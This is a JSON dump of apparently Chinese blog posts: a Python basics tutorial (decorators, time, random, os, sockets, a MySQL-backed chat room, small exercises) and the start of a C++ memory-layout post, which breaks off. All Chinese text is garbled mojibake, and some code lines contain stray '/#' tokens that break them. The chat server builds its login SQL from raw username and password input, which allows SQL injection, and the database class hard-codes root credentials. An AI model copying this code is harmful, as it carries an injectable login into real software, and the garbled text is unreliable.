åœ¨é—­åŒ…çš„åŸºç¡€ä¸Šï¼Œä½¿ç”¨äº†å¤–éƒ¨ä¼ å…¥çš„å‡½æ•°\n#   ä½œç”¨: åœ¨ä¸æ›´æ”¹å‡½æ•°åç§°ï¼Œå‚æ•°ä¸ªæ•°å’Œè°ƒç”¨æ–¹å¼çš„å‰æä¸‹ä¸ºæŸä¸ªå‡½æ•°æ·»åŠ æ–°çš„åŠŸèƒ½\n\ndef w1(func):\n    def inner():\n        print(&#39;è¿™é‡Œæ˜¯æ–°æ·»åŠ çš„å†…å®¹&#39;)\n        func()\n        print(&#39;è¿™é‡Œä¹Ÿæ˜¯æ–°æ·»åŠ çš„å†…å®¹&#39;)\n    return inner\n\n# @w1\n# f1 æ˜¯éœ€è¦è¢«è£…é¥°çš„å‡½æ•°\ndef f1():\n    print(&#39;f1&#39;)\n\nf1()\n\n\n# è£…é¥°å™¨å®é™…ä¸Šå«åšè¯­æ³•ç³–ï¼Œä¾‹å¦‚æ•°ç»„ arr[i][j] -&gt; *(*(arr+i)+j)\n&quot;&quot;&quot;\n    def æ–°çš„f1():\n        print(&#39;è¿™é‡Œæ˜¯æ–°æ·»åŠ çš„å†…å®¹&#39;)\n        f1() -&gt; æ—§çš„\n        print(&#39;è¿™é‡Œä¹Ÿæ˜¯æ–°æ·»åŠ çš„å†…å®¹&#39;)\n&quot;&quot;&quot;\nf1 &#x3D; w1(f1)         # @w1  def f1(): ....\nf1()\n\ntimeæ¨¡å—Python\nimport time\n\n# è·å–å½“å‰çš„æ—¶é—´æˆ³(ä½¿ç”¨æµ®ç‚¹æ•°è®°å½•çš„ç§’æ•°)\nprint(time.time())\n\n# å°†æŒ‡å®šçš„æ—¶é—´æˆ³è½¬æ¢ä¸ºå½“å‰æ—¶åŒºçš„å…ƒç»„\nprint(time.localtime())\nprint(time.gmtime())        # æ ‡å‡†æ—¶åŒº\n\n# å°†æ—¶é—´å…ƒç»„è½¬æ¢ä¸ºæ—¶é—´æˆ³\nprint(time.mktime(time.localtime()))\n\n# ç¡çœ ä¸€å®šçš„æ—¶é—´\ntime.sleep(0.500)\n\n# å°†æ—¶é—´å…ƒç»„è½¬æ¢æˆæ—¶é—´å­—ç¬¦ä¸²\nprint(time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;,time.localtime()))\n\nrandomæ¨¡å—Python\nimport random\n\n# randint å’Œ randrange\nfor i in range(100):\n    # ç”Ÿæˆ 0&lt;&#x3D;value&lt;&#x3D;10 çš„ä¸€ä¸ªéšæœºæ•°å€¼\n    print(random.randint(0, 10))\n    # å…ˆç”Ÿæˆä¸€ä¸ª range åºåˆ—ï¼Œä»ä¸­è·å–ä¸€ä¸ªéšæœºå€¼\n    print(random.randrange(0, 10))\n\n# åˆ›å»ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨äºä¿å­˜éªŒè¯ç \ntmp &#x3D; &quot;&quot;\n# ä¸»è¦åœ¨äºéå†çš„æ¬¡æ•°ï¼Œå¾ªç¯ 6 æ¬¡\nfor i in range(6):\n    # ç”Ÿæˆä¸€ä¸ªæ»¡è¶³ range æ¡ä»¶çš„éšæœºå€¼\n    rad1 &#x3D; random.randrange(4)\n    # æœ‰ä¸€åŠçš„æ¦‚ç‡è¿›å…¥ä¸‹é¢çš„ä¸¤ä¸ªåˆ†æ”¯\n    if rad1 &#x3D;&#x3D; 1 or rad1 &#x3D;&#x3D; 3:\n        # ç”Ÿæˆä¸€ä¸ªéšæœºçš„æ•´æ•°å¹¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ·»åŠ åˆ°æœ«å°¾\n        rad2 &#x3D; random.randrange(0, 10)\n        tmp +&#x3D; str(rad2)\n    else:\n        # ç”Ÿæˆä¸€ä¸ªéšæœºçš„å¤§å°å­—æ¯æ·»åŠ åˆ°ç»“å°¾\n        rad3 &#x3D; random.randrange(65, 91)\n        tmp +&#x3D; chr(rad3)\nprint(tmp)\n\n\n# ä»æŒ‡å®šåºåˆ—ä¸­éšæœºå–å‡ºä¸€ä¸ªå…ƒç´ \nprint(random.choice([&#39;é¥­&#39;, &#39;ç²¥&#39;, &#39;é¢&#39;, &#39;é¥¿&#39;]))\n\n# æ‰“ä¹±ä¸€ä¸ªåºåˆ—(æ´—ç‰Œ)\nl &#x3D; [1, 2, 3, 4, 5, 6, 7]\nrandom.shuffle(l)\nprint(l)\n\nosæ¨¡å—Python\n# os æ¨¡å—æä¾›äº†ç›®å½•å’Œæ–‡ä»¶èƒ½å¤Ÿæ‰§è¡Œçš„ä¸€äº›æ“ä½œ\nimport os\n\nbase &#x3D; &#39;D:\\\\&#39;\n\n# é€šè¿‡å¾ªç¯è·å–åˆ°æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹\nfor name in os.listdir(base):\n    # åˆ¤æ–­ç›®æ ‡åç§°æ˜¯å¦ä¸ºæ–‡ä»¶\n    if os.path.isfile(base+name):\n        # è¾“å‡ºæ–‡ä»¶åç§°ä»¥åŠåç¼€å\n        print(os.path.splitext(name))\n\nç½‘ç»œç¼–ç¨‹å¥—æ¥å­—æœåŠ¡ç«¯Python\nfrom socket import *\n\n\ndef main():\n    # 1. åˆ›å»ºå¥—æ¥å­—å¯¹è±¡\n    server &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. ç»‘å®šå¯¹è±¡åˆ°æŒ‡å®šçš„ipå’Œç«¯å£\n    server.bind((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 3. å¼€å¯å¥—æ¥å­—çš„ç›‘å¬çŠ¶æ€\n    server.listen(SOMAXCONN)\n\n    # 4. ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥\n    client, address &#x3D; server.accept()\n\n    # 5. æ”¶å‘æ•°æ®\n    client.send(&#39;welcome&#39;.encode(&#39;utf-8&#39;))\n\n    # 6. å…³é—­å¥—æ¥å­—\n    client.close()\n    server.close()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\nå®¢æˆ·ç«¯Python\nfrom socket import *\n\n\ndef main():\n    # 1. åˆ›å»ºå¥—æ¥å­—å¯¹è±¡\n    client &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥\n    client.connect((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 3. æ”¶å‘æ•°æ®\n    print(client.recv(100).decode(&#39;utf-8&#39;))\n\n    # 6. å…³é—­å¥—æ¥å­—\n    client.close()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\nèŠå¤©å®¤(å¯å¤šå¼€)æœåŠ¡ç«¯Python\nfrom socket import *\nfrom struct import *\nfrom threading import *\nMysql &#x3D; __import__(&#39;æ•°æ®åº“æ“ä½œ&#39;)#æºç å°±åœ¨ä¸‹ä¸€ä¸ªèŠ‚ç‚¹\n\n\n# æä¾›ä¸€ä¸ªåˆ—è¡¨ä¿å­˜æ‰€æœ‰çš„åœ¨çº¿ç”¨æˆ·\nclients &#x3D; &#123;&#125;\n\n# åˆ›å»ºä¸€ä¸ªæ•°æ®åº“å¯¹è±¡ï¼Œè¿æ¥åˆ° chatroom\nmysql &#x3D; Mysql.Mysql(&#39;chatroom&#39;)\n\n\n# çº¿ç¨‹å›è°ƒå‡½æ•°: æ¥æ”¶æ¥è‡ªå¦ä¸€è¾¹çš„ä¿¡æ¯\ndef reciver(sock):\n    # æ¥æ”¶ç›®æ ‡å‘é€è¿‡æ¥çš„ç”¨æˆ·åå’Œå¯†ç  char[32] + char[32]\n    username, password &#x3D; unpack(&#39;32s32s&#39;, sock.recv(64))\n    username &#x3D; username.decode(&#39;utf-8&#39;).strip(&#39;\\0&#39;)\n    password &#x3D; password.decode(&#39;utf-8&#39;).strip(&#39;\\0&#39;)\n\n    # æŸ¥è¯¢ç›®æ ‡ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦åŒ¹é…\n    count, result &#x3D; mysql.select(f&quot;SELECT * FROM user WHERE username&#x3D;&#39;&#123;username&#125;&#39; AND password&#x3D;MD5(&#39;&#123;password&#125;&#39;);&quot;)\n\n    # å¦‚æœç™»å½•æˆåŠŸï¼Œå°±æ·»åŠ åˆ°åœ¨çº¿åˆ—è¡¨\n    if count &#x3D;&#x3D; 0:\n        sock.send(&#39;ä¸ok&#39;.encode())\n        return\n\n    if username in clients:\n        sock.send(&#39;ä¸ok&#39;.encode())\n        return\n    else:\n        sock.send(&#39;ok&#39;.encode())\n        clients[username] &#x3D; sock\n        print(sock.getpeername(), &#39;è¿æ¥åˆ°äº†èŠå¤©å®¤&#39;)\n\n    while True:\n        try:\n            # æ¥æ”¶å®¢æˆ·ç«¯å‘é€çš„æ•°æ®ï¼Œç”±äºåªæ˜¯è½¬å‘ï¼Œä¸åšè§£ç \n            content &#x3D; sock.recv(100)\n            # éå†åœ¨çº¿ç”¨æˆ·ï¼Œå¦‚æœä¸æ˜¯å‘é€è€…å°±è½¬å‘\n            for client in clients.values():\n                if client !&#x3D; sock:\n                    client.send(username.encode() + b&#39;: &#39; + content)\n        except Exception as e:\n            # print(&#39;error&#39;, e)\n            # å®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨è¿æ¥ä¸­æ–­ï¼Œéœ€è¦ä»åˆ—è¡¨ä¸­ç§»é™¤\n            print(sock.getpeername(), &#39;ç¦»å¼€äº†èŠå¤©å®¤&#39;)\n            del clients[username]\n            # ä¸€å®šè¦è®°å¾— break è·³å‡ºå½“å‰çš„å¾ªç¯\n            break\n\n\ndef main():\n    # 1. åˆ›å»ºå¥—æ¥å­—å¯¹è±¡\n    server &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. ç»‘å®šå¯¹è±¡åˆ°æŒ‡å®šçš„ipå’Œç«¯å£\n    server.bind((&#39;127.0.0.1&#39;, 0x1515))\n\n    # 3. å¼€å¯å¥—æ¥å­—çš„ç›‘å¬çŠ¶æ€\n    server.listen(SOMAXCONN)\n\n    while True:\n        # 4. ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥\n        client, address &#x3D; server.accept()\n\n        # 5. æ”¶å‘æ•°æ®\n        Thread(target&#x3D;reciver, args&#x3D;(client,)).start()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\nå®¢æˆ·ç«¯Python\nfrom socket import *\nfrom struct import *\nfrom threading import *\n\n\n# çº¿ç¨‹å›è°ƒå‡½æ•°: æ¥æ”¶æ¥è‡ªå¦ä¸€è¾¹çš„ä¿¡æ¯\ndef reciver(sock):\n    while True:\n        try:\n            # å¦‚æœå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨æ–­å¼€è¿æ¥ï¼Œä¼šäº§ç”Ÿå¼‚å¸¸\n            print(sock.recv(100).decode(&#39;utf-8&#39;))\n        except Exception as e:\n            print(&#39;error&#39;, e)\n            # ä¸€å®šè¦è®°å¾— break è·³å‡ºå½“å‰çš„å¾ªç¯\n            break\n\n\ndef main():\n    # 1. åˆ›å»ºå¥—æ¥å­—å¯¹è±¡\n    client &#x3D; socket(AF_INET, SOCK_STREAM)\n\n    # 2. ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥\n    client.connect((&#39;127.0.0.1&#39;, 0x1515))\n\n    # å¡«å†™ç”¨æˆ·åå’Œå¯†ç å°è¯•è¿›è¡Œç™»å½•\n    username &#x3D; input(&#39;username: &#39;)\n    password &#x3D; input(&#39;password: &#39;)\n    content &#x3D; pack(&#39;32s32s&#39;, username.encode(), password.encode())\n    client.send(content)\n\n    # æ¥æ”¶ç™»å½•çš„ç»“æœï¼Œå¦‚æœå¤±è´¥ï¼Œå°±é€€å‡º\n    if client.recv(100).decode() &#x3D;&#x3D; &#39;ä¸ok&#39;:\n        return\n    print(&#39;xxxxxxx&#39;)\n\n    # 3. æ”¶å‘æ•°æ®\n    Thread(target&#x3D;reciver, args&#x3D;(client, )).start()\n    while True:\n        content &#x3D; input(&#39;&#39;)\n        if content &#x3D;&#x3D; &#39;quit&#39;:\n            break\n        else:\n            client.send(content.encode())\n\n    # 6. å…³é—­å¥—æ¥å­—\n    client.close()\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    main()\n\næ•°æ®åº“æ“ä½œPython\n# é€šè¿‡ pymysql è¿æ¥å¹¶æ“ä½œ mysql æ•°æ®åº“\nimport pymysql\n\n\nclass Mysql(object):\n\n    def __init__(self, database_name):\n        try:\n            # é€šè¿‡ connect å‡½æ•°ä¼ å…¥æ•°æ®åº“çš„é…ç½®ä¿¡æ¯è¿æ¥åˆ°æ•°æ®åº“\n            self.connect &#x3D; pymysql.connect(host&#x3D;&#39;127.0.0.1&#39;, user&#x3D;&#39;root&#39;, password&#x3D;&#39;123456&#39;, port&#x3D;3306, database&#x3D;database_name)\n            # ä¸€æ—¦æ•°æ®åº“è¿æ¥æˆåŠŸï¼Œæˆ‘ä»¬å°±éœ€è¦è·å–åˆ°æ¸¸æ ‡å¯¹è±¡\n            self.cursor &#x3D; self.connect.cursor()#è·å–æ“ä½œæ¸¸æ ‡\n        except Exception as e:\n            print(&#39;error&#39;, e)\n\n    def insert(self, sql: str):\n        try:\n            # executeæ‰§è¡Œsqlè¯­å¥\n            self.cursor.execute(sql)\n            # å¯¹äºæ‰€æœ‰ä¿®æ”¹æ•°æ®åº“çš„æ“ä½œï¼Œéƒ½éœ€è¦æäº¤\n            self.connect.commit()\n        except Exception as e:\n            #å›æ»šæ“ä½œ\n            self.connect.rollback()\n            print(&#39;error&#39;, e)\n\n    def select(self, sql: str):\n        try:\n            self.cursor.execute(sql)\n            # ä»æ•°æ®åº“ä¸­è·å–åˆ°æŸ¥è¯¢çš„ç»“æœé›†ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œ\n            # å…ƒç»„ä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºä¸€è¡Œï¼Œä¿å­˜çš„æ˜¯ä¸€è¡Œä¸­çš„æ¯ä¸€åˆ—\n            result &#x3D; self.cursor.fetchall()&#x2F;#è·å–æ‰€æœ‰å†…å®¹\n            count &#x3D; self.cursor.rowcount&#x2F;#è·å–è¡Œæ•°\n            # å°†æŸ¥è¯¢åˆ°çš„è¡Œæ•°å’Œå†…å®¹è¿›è¡Œæ‰“åŒ…ï¼Œè¿”å›ç»™è°ƒç”¨æ–¹\n            return count, result\n        except Exception as e:\n            print(&#39;error&#39;, e)\n\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    sql &#x3D; Mysql(&#39;student&#39;)\n    sql.insert(&quot;INSERT INTO stu_class VALUE(10, &#39;ten&#39;)&quot;)\n    print(sql.select(&#39;select * from stu_class;&#39;))\n\nå°åŠŸèƒ½å®ç°é˜¶ä¹˜Code\ndef Get_Num(Num):\n    j &#x3D; 0\n    for b in range(1, Num+1):\n        i &#x3D; 1\n        for c in range(1, b+1):\n                i *&#x3D;c\n                #print(i)\n        j +&#x3D; i\n    return j\n    \nprint(Get_Num(5))\n\næ°´ä»™èŠ±æ•°Python\n&#39;&#39;&#39;æ°´ä»™èŠ±æ•°&#39;&#39;&#39;\n\nNum &#x3D; 100\n\nwhile Num &lt; 1000:\n    if Num &#x3D;&#x3D; (Num&#x2F;&#x2F;100 % 10) **3 + (Num&#x2F;&#x2F;10 % 10) **3 + (Num&#x2F;&#x2F;1 % 10)**3:\n        print(Num)\n    Num +&#x3D;1\n\nä¸‰è§’å›¾å½¢Code\næ‰“å°å¦‚ä¸‹å›¾å½¢\n\n               *\n              ***\n             *****\n            *******\n\næ–¹æ³•1Python\nfor i in range(4):\n    print(&quot; &quot;*(4-i),&quot;*&quot;*(2*i+1))\n\næ–¹æ³•2Python\nnum &#x3D; 1\nnum2 &#x3D; 4\nnum3 &#x3D; 4\nwhile num &lt;&#x3D; 4:\n    num1 &#x3D; 1\n    while num1 &lt;&#x3D; 7:\n        if num1 &gt;&#x3D; num2 and num1 &lt;&#x3D;num3:\n            print(&#39;*&#39;, end&#x3D;&#39;&#39;)\n        else:\n            print(&#39; &#39;, end&#x3D;&#39;&#39;)\n        num1 +&#x3D; 1\n    num2 -&#x3D; 1\n    num3 +&#x3D; 1\n    print(&#39;&#39;)\n    num +&#x3D; 1\n\nè±å½¢Code\næ‰“å°å¦‚ä¸‹å›¾å‹\n               *\n              ***\n             *****\n            *******\n             *****\n              ***\n               *\nPython\nnum &#x3D; 1\nnum2 &#x3D; 4\nnum3 &#x3D; 4\nwhile num &lt;&#x3D; 7:\n    num1 &#x3D; 1\n    while num1 &lt;&#x3D; 7:\n        if num1 &gt;&#x3D; num2 and num1 &lt;&#x3D;num3:\n            print(&#39;*&#39;, end&#x3D;&#39;&#39;)\n        else:\n            print(&#39; &#39;, end&#x3D;&#39;&#39;)\n        num1 +&#x3D; 1\n    if num &lt; 4:\n        num2 -&#x3D; 1\n        num3 +&#x3D; 1\n    else:\n        num2 +&#x3D; 1\n        num3 -&#x3D; 1\n    print(&#39;&#39;)\n    num +&#x3D; 1\n\nç©ºè±å½¢Code\n   æ‰“å°å¦‚ä¸‹å›¾å‹\n   *\n  * *\n *   *\n*     *\n *   *\n  * *\n   *\nPython\nnum &#x3D; 1\nnum2 &#x3D; 4\nnum3 &#x3D; 4\nwhile num &lt;&#x3D; 7:\n    num1 &#x3D; 1\n    while num1 &lt;&#x3D; 7:\n        if num1 &#x3D;&#x3D; num2 or num1 &#x3D;&#x3D;num3:\n            print(&#39;*&#39;, end&#x3D;&#39;&#39;)\n        else:\n            print(&#39; &#39;, end&#x3D;&#39;&#39;)\n        num1 +&#x3D; 1\n    if num &lt; 4:\n        num2 -&#x3D; 1\n        num3 +&#x3D; 1\n    else:\n        num2 +&#x3D; 1\n        num3 -&#x3D; 1\n    print(&#39;&#39;)\n    num +&#x3D; 1\n\nå†’æ³¡æ’åºPython\n&#39;&#39;&#39;å†’æ³¡æ’åº&#39;&#39;&#39;\nList &#x3D; [20, 30, 40, 3, 6, 47, 25, 77, 15]\n\nNum &#x3D; 0\ntemp &#x3D; 0\nlenth &#x3D;  len(List) - 1\nwhile Num &lt;&#x3D; lenth-1:\n    for i in range(len(List)):\n        if i &lt; lenth:\n            if List[i] &gt; List[i+1]:\n                temp &#x3D; List[i]\n                List[i] &#x3D; List[i+1]\n                List[i+1] &#x3D; temp\n    Num +&#x3D; 1\nprint(List)\n\næ¨è¾‰ä¸‰è§’æ–¹æ³•1Python\ndef generate(numRows):\n        if numRows&#x3D;&#x3D;0:\n            return []\n        l1 &#x3D; [[1]]\n        n &#x3D; 1\n        while n&lt;numRows:\n            l1.append(map(lambda x,y:x+y, [0]+l1[-1], l1[-1]+[0]))\n            n +&#x3D; 1\n        return l1\n\næ–¹æ³•2Python\n#æ¨è¾‰ä¸‰è§’\ndef generate(numRows):\n        if numRows&#x3D;&#x3D;0:\n            return []\n        if numRows&#x3D;&#x3D;1:\n            return[[1]]\n        if numRows&#x3D;&#x3D;2:\n            return [[1],[1,1]]\n        numRows -&#x3D; 2\n        rList &#x3D; [[1],[1,1]]\n        while numRows&gt;0:\n            newList &#x3D; [1]\n            for i in range(len(rList[-1])-1):\n                newList.append(rList[-1][i]+rList[-1][i+1])\n            newList.append(1)\n            rList.append(newList)\n            numRows -&#x3D; 1\n        return rList\n\næ–¹æ³•3Python\ndef Yhsj(row):\n    result &#x3D; [1]\n    n &#x3D; 0\n    while n &lt; row:\n        if n &lt; 1:\n            yield result\n        else:\n            a &#x3D; 1\n            t &#x3D; tuple(x for x in result)\n            result &#x3D; [1, 1]\n            while a &lt; n:\n                result.insert(a, t[a - 1] + t[a])\n                a +&#x3D; 1\n            yield result\n        n +&#x3D; 1\n\næ–¹æ³•4Python\ndef generate(self, numRows):\n        &quot;&quot;&quot;\n        :type numRows: int\n        :rtype: List[List[int]]\n        &quot;&quot;&quot;\n        l1 &#x3D; [1]\n        l2 &#x3D; []\n        n &#x3D; 0\n        while n&lt;numRows:\n            l2.append(l1)\n            l1 &#x3D; [sum(t) for t in zip([0]+l1, l1+[0])]\n            n +&#x3D; 1\n        return l2\n\næ–¹æ³•5Python\ndef generate(self, numRows):\n        &quot;&quot;&quot;\n        :type numRows: int\n        :rtype: List[List[int]]\n        &quot;&quot;&quot;\n        if numRows&#x3D;&#x3D;0:\n            return []\n        if numRows&#x3D;&#x3D;1:\n            return[[1]]\n        if numRows&#x3D;&#x3D;2:\n            return [[1],[1,1]]\n        numRows -&#x3D; 2\n        rList &#x3D; [[1],[1,1]]\n        while numRows&gt;0:\n            newList &#x3D; [1]\n            for i in range(len(rList[-1])-1):\n                newList.append(rList[-1][i]+rList[-1][i+1])\n            newList.append(1)\n            rList.append(newList)\n            numRows -&#x3D; 1\n        return rList\n\næ–¹æ³•6Python\ndef Yanghui():\n    n &#x3D; [1]\n    while True:\n        yield n\n        n.append(0)\n        n &#x3D; [n[i] + n[i-1] for i in range(len(n))]\n\ndef fun(n):\n    for i in Yanghui():\n        print(i)\n        n -&#x3D; 1\n        if n &#x3D;&#x3D; 0:\n            break\n            \n            \n            \nfun(10)\n\n\n\n\n\n\n\n\n\n\nç²—ç•¥çš„å†™ä¸€ä¸‹ï¼Œåé¢è¡¥ä¸Š\n","slug":"pythonåŸºç¡€","date":"2020-11-24T03:30:44.000Z","categories_index":"PythonåŸºç¡€","tags_index":"PythonåŸºç¡€","author_index":"Akpigs"},{"id":"57d886b036cac1f1f4453ef4a9cee3e6","title":"C/C++é‚£äº›äº‹","content":"C&#x2F;C++æ•™ç¨‹æœ¬é˜¶æ®µä¸»è¦é’ˆå¯¹C++&#x3D;&#x3D;é¢å‘å¯¹è±¡&#x3D;&#x3D;ç¼–ç¨‹æŠ€æœ¯åšè¯¦ç»†è®²è§£ï¼Œæ¢è®¨C++ä¸­çš„æ ¸å¿ƒå’Œç²¾é«“ã€‚\nå†…å­˜åˆ†åŒºæ¨¡å‹C++ç¨‹åºåœ¨æ‰§è¡Œæ—¶ï¼Œå°†å†…å­˜å¤§æ–¹å‘åˆ’åˆ†ä¸º4ä¸ªåŒºåŸŸ\n\nä»£ç åŒºï¼šå­˜æ”¾å‡½æ•°ä½“çš„äºŒè¿›åˆ¶ä»£ç ï¼Œç”±æ“ä½œç³»ç»Ÿè¿›è¡Œç®¡ç†çš„\nå…¨å±€åŒºï¼šå­˜æ”¾å…¨å±€å˜é‡å’Œé™æ€å˜é‡ä»¥åŠå¸¸é‡\næ ˆåŒºï¼šç”±ç¼–è¯‘å™¨è‡ªåŠ¨åˆ†é…é‡Šæ”¾, å­˜æ”¾å‡½æ•°çš„å‚æ•°å€¼,å±€éƒ¨å˜é‡ç­‰\nå †åŒºï¼šç”±ç¨‹åºå‘˜åˆ†é…å’Œé‡Šæ”¾,è‹¥ç¨‹åºå‘˜ä¸é‡Šæ”¾,ç¨‹åºç»“æŸæ—¶ç”±æ“ä½œç³»ç»Ÿå›æ”¶\n\nå†…å­˜å››åŒºæ„ä¹‰ï¼š\nä¸åŒåŒºåŸŸå­˜æ”¾çš„æ•°æ®ï¼Œèµ‹äºˆä¸åŒçš„ç”Ÿå‘½å‘¨æœŸ, ç»™æˆ‘ä»¬æ›´å¤§çš„çµæ´»ç¼–ç¨‹\nç¨‹åºè¿è¡Œå‰åœ¨ç¨‹åºç¼–è¯‘åï¼Œç”Ÿæˆäº†exeå¯æ‰§è¡Œç¨‹åºï¼Œæœªæ‰§è¡Œè¯¥ç¨‹åºå‰åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸ\nä»£ç åŒºï¼š\nå­˜æ”¾ CPU æ‰§è¡Œçš„æœºå™¨æŒ‡ä»¤\nä»£ç åŒºæ˜¯å…±äº«çš„ï¼Œå…±äº«çš„ç›®çš„æ˜¯å¯¹äºé¢‘ç¹è¢«æ‰§è¡Œçš„ç¨‹åºï¼Œåªéœ€è¦åœ¨å†…å­˜ä¸­æœ‰ä¸€ä»½ä»£ç å³å¯\nä»£ç åŒºæ˜¯åªè¯»çš„ï¼Œä½¿å…¶åªè¯»çš„åŸå› æ˜¯é˜²æ­¢ç¨‹åºæ„å¤–åœ°ä¿®æ”¹äº†å®ƒçš„æŒ‡ä»¤\nå…¨å±€åŒºï¼š\nå…¨å±€å˜é‡å’Œé™æ€å˜é‡å­˜æ”¾åœ¨æ­¤.\nå…¨å±€åŒºè¿˜åŒ…å«äº†å¸¸é‡åŒº, å­—ç¬¦ä¸²å¸¸é‡å’Œå…¶ä»–å¸¸é‡ä¹Ÿå­˜æ”¾åœ¨æ­¤.\n&#x3D;&#x3D;è¯¥åŒºåŸŸçš„æ•°æ®åœ¨ç¨‹åºç»“æŸåç”±æ“ä½œç³»ç»Ÿé‡Šæ”¾&#x3D;&#x3D;.\nç¤ºä¾‹ï¼š\n&#x2F;&#x2F;å…¨å±€å˜é‡\nint g_a &#x3D; 10;\nint g_b &#x3D; 10;\n\n&#x2F;&#x2F;å…¨å±€å¸¸é‡\nconst int c_g_a &#x3D; 10;\nconst int c_g_b &#x3D; 10;\n\nint main() &#123;\n\n\t&#x2F;&#x2F;å±€éƒ¨å˜é‡\n\tint a &#x3D; 10;\n\tint b &#x3D; 10;\n\n\t&#x2F;&#x2F;æ‰“å°åœ°å€\n\tcout &lt;&lt; &quot;å±€éƒ¨å˜é‡aåœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å±€éƒ¨å˜é‡båœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;b &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;å…¨å±€å˜é‡g_aåœ°å€ä¸ºï¼š &quot; &lt;&lt;  (int)&amp;g_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å…¨å±€å˜é‡g_båœ°å€ä¸ºï¼š &quot; &lt;&lt;  (int)&amp;g_b &lt;&lt; endl;\n\n\t&#x2F;&#x2F;é™æ€å˜é‡\n\tstatic int s_a &#x3D; 10;\n\tstatic int s_b &#x3D; 10;\n\n\tcout &lt;&lt; &quot;é™æ€å˜é‡s_aåœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;s_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;é™æ€å˜é‡s_båœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;s_b &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;å­—ç¬¦ä¸²å¸¸é‡åœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;&quot;hello world&quot; &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å­—ç¬¦ä¸²å¸¸é‡åœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;&quot;hello world1&quot; &lt;&lt; endl;\n\n\tcout &lt;&lt; &quot;å…¨å±€å¸¸é‡c_g_aåœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;c_g_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å…¨å±€å¸¸é‡c_g_båœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;c_g_b &lt;&lt; endl;\n\n\tconst int c_l_a &#x3D; 10;\n\tconst int c_l_b &#x3D; 10;\n\tcout &lt;&lt; &quot;å±€éƒ¨å¸¸é‡c_l_aåœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;c_l_a &lt;&lt; endl;\n\tcout &lt;&lt; &quot;å±€éƒ¨å¸¸é‡c_l_båœ°å€ä¸ºï¼š &quot; &lt;&lt; (int)&amp;c_l_b &lt;&lt; endl;\n\n\tsystem(&quot;pause&quot;);\n\n\treturn 0;\n&#125;\n\næ‰“å°ç»“æœï¼š\nå±€éƒ¨å˜é‡aåœ°å€ä¸ºï¼š 8321264\nå±€éƒ¨å˜é‡båœ°å€ä¸ºï¼š 8321252\nå…¨å±€å˜é‡g_aåœ°å€ä¸ºï¼š 10534912\nå…¨å±€å˜é‡g_båœ°å€ä¸ºï¼š 10534916\né™æ€å˜é‡s_aåœ°å€ä¸ºï¼š 10534920\né™æ€å˜é‡s_båœ°å€ä¸ºï¼š 10534924\nå­—ç¬¦ä¸²å¸¸é‡åœ°å€ä¸ºï¼š 10525684\nå­—ç¬¦ä¸²å¸¸é‡åœ°å€ä¸ºï¼š 10525700\nå…¨å±€å¸¸é‡c_g_aåœ°å€ä¸ºï¼š 10525488\nå…¨å±€å¸¸é‡c_g_båœ°å€ä¸ºï¼š 10525492\nå±€éƒ¨å¸¸é‡c_l_aåœ°å€ä¸ºï¼š 8321240\nå±€éƒ¨å¸¸é‡c_l_båœ°å€ä¸ºï¼š 8321228\nè¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .\n\næ€»ç»“ï¼š\n\nC++ä¸­åœ¨ç¨‹åºè¿è¡Œå‰åˆ†ä¸ºå…¨å±€åŒºå’Œä»£ç åŒº\nä»£ç åŒºç‰¹ç‚¹æ˜¯å…±äº«å’Œåªè¯»\nå…¨å±€åŒºä¸­å­˜æ”¾å…¨å±€å˜é‡ã€é™æ€å˜é‡ã€å¸¸é‡\nå¸¸é‡åŒºä¸­å­˜æ”¾ constä¿®é¥°çš„å…¨å±€å¸¸é‡ å’Œ å­—ç¬¦ä¸²å¸¸é‡\n\nç¨‹åºè¿è¡Œåæ ˆåŒºï¼š\nç”±ç¼–è¯‘å™¨è‡ªåŠ¨åˆ†é…é‡Šæ”¾, å­˜æ”¾å‡½æ•°çš„å‚æ•°å€¼,å±€éƒ¨å˜é‡ç­‰\næ³¨æ„äº‹é¡¹ï¼šä¸è¦è¿”å›å±€éƒ¨å˜é‡çš„åœ°å€ï¼Œæ 